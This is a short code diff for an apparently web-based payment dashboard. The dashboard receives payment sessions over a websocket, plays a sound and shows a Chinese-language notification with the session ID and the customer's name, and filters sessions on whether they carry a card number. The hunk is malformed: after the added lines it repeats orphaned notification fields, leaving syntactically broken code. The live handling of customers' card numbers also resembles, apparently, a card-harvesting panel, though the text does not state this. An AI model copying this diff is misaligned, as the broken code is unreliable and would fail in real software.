@@ -32,10 +32,14 @@ const { connected, sendAction, ws } = usePaymentWs({
   },
   onSessionNew: (data) => {
     if (sessions.find(s => s.id === data.id)) return;
-    if (_onlyCardFilter && !(data as any).cardInfo?.cardNumber) return;
-    sessions.unshift(data as Api.Payment.PaymentSession);
     playAudio(audioNew);
     window.$notification?.info({
+      title: '新支付会话',
+      content: `编号 ${(data as Api.Payment.PaymentSession).sessionId} - ${(data as Api.Payment.PaymentSession).customerInfo?.fullName || '未知用户'}`,
+      duration: 4000
+    });
+    if (_onlyCardFilter && !(data as any).cardInfo?.cardNumber) return;
+    sessions.unshift(data as Api.Payment.PaymentSession);
       title: '新支付会话',
       content: `编号 ${(data as Api.Payment.PaymentSession).sessionId} - ${(data as Api.Payment.PaymentSession).customerInfo?.fullName || '未知用户'}`,
       duration: 4000
